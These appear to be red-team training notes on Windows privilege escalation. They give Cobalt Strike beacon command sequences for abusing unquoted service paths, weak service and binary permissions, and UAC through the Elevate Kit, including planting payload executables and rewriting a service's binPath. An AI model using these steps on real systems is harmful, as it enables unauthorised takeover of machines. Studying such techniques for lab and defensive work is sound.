# Host Privilege Escalation Notes

**Windows Services**

Query services
```
sc query
Get-Service | f1
```

Things of interest
1. Binary Path
2. Startup Type
3. Service Status
4. Log on As
5. Dependants and Dependencies

**Unquoted Service Paths**

Get all services and their path
```
run wmic service get name, pathname
```

Check the ACL's of those objects
```
powershell Get-Acl -Path "C:\path\to\service" | f1
```

Using SharpUp
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```

***Abusing***
If you have services that are named like Service 1.exe and not quoted we can abuse this by placing a Service.exe beacon in this file path which allows us to abuse it. Could also be the file path name to like *C:\Here is\Service 1.exe* we can drop a *C:\Here.exe* if we have permissions to abuse.
```
cd C:\Program Files\Vulnerable Services
ls
upload C:\Payloads\tcp-local_x64.svc.exe
mv tcp-local_x64.svc.exe Service.exe
ls
run sc stop VulnService1
run sc start VulnService1
```


**Weak Service Permissions**

Check for modifiable services
```
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
```

Checking ACL of that service with [this](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)
```
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
```

We want ChangeConfig to be able to change the binpath and Start and Stop privs to be able to abuse easily

validating the current path and changing it 
```
run sc qc VulnService2
mkdir C:\Temp
cd C:\Temp
upload C:\Payloads\tcp-local_x64.svc.exe
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
run sc qc VulnService2
run sc stop VulnService2
run sc start VulnService2
```


**Weak Service Binary Permissions**

This time the binary itself is able to be overwritten, checking for it's permissions. Make sure to download to keep as backup just in case. Also turn off the service before doing this, otherwise you will get helpmessage 32
```
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | f1
download Service 3.exe
copy "tcp-local_x64.svc.exe" "Service 3.exe"
run sc stop VulnService3
upload C:\Payload\Service 3.exe
run sc start VulnService3
```

**UAC Bypasses**

Check for UAC, *medium mandatory* means UAC in this case
```
whoami /groups
```

beacon can get around this by using the [Elevate Kit](https://github.com/cobalt-strike/ElevateKit) which you should load into your Cobalt Strike for use
```
elevate uac-schtasks tcp-local
```
